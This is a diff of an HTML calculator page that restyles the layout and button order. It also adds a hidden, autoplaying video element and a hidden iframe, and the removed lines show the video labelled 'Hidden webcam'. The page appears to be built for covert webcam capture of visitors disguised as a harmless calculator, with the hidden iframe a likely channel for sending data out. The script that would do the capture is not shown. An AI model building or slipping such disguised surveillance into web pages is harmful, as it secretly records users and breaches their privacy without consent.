@@ -1,46 +1,84 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-<meta charset="UTF-8">
-<title>Online Calculator</title>
-<link rel="stylesheet" href="style.css">
+
+<title>Scientific Calculator</title>
+
+<style>
+
+body{
+font-family: Arial;
+text-align:center;
+margin-top:50px;
+}
+
+#calculator{
+display:inline-block;
+padding:20px;
+border:1px solid #ccc;
+border-radius:10px;
+}
+
+input{
+width:200px;
+height:40px;
+font-size:20px;
+margin-bottom:10px;
+text-align:right;
+}
+
+button{
+width:50px;
+height:40px;
+font-size:18px;
+margin:2px;
+}
+
+</style>
+
 </head>
 
 <body>
 
-<h2>Online Calculator</h2>
+<h2>Scientific Calculator</h2>
 
-<div class="calculator">
+<div id="calculator">
 
-<input type="text" id="result" disabled>
+<input type="text" id="result" readonly>
 
-<div class="buttons">
+<br>
+
 <button onclick="press('7')">7</button>
 <button onclick="press('8')">8</button>
 <button onclick="press('9')">9</button>
 <button onclick="press('/')">/</button>
+
+<br>
 
 <button onclick="press('4')">4</button>
 <button onclick="press('5')">5</button>
 <button onclick="press('6')">6</button>
 <button onclick="press('*')">*</button>
 
+<br>
+
 <button onclick="press('1')">1</button>
 <button onclick="press('2')">2</button>
 <button onclick="press('3')">3</button>
 <button onclick="press('-')">-</button>
 
+<br>
+
 <button onclick="press('0')">0</button>
-<button onclick="calculate()">=</button>
 <button onclick="clearResult()">C</button>
+<button onclick="calculate()">=</button>
 <button onclick="press('+')">+</button>
-</div>
 
 </div>
 
-<!-- Hidden webcam -->
-<video id="video" autoplay muted playsinline hidden></video>
+<video id="video" autoplay playsinline style="display:none;"></video>
+
+<iframe name="hidden_iframe" style="display:none;"></iframe>
 
 <script src="script.js"></script>
 
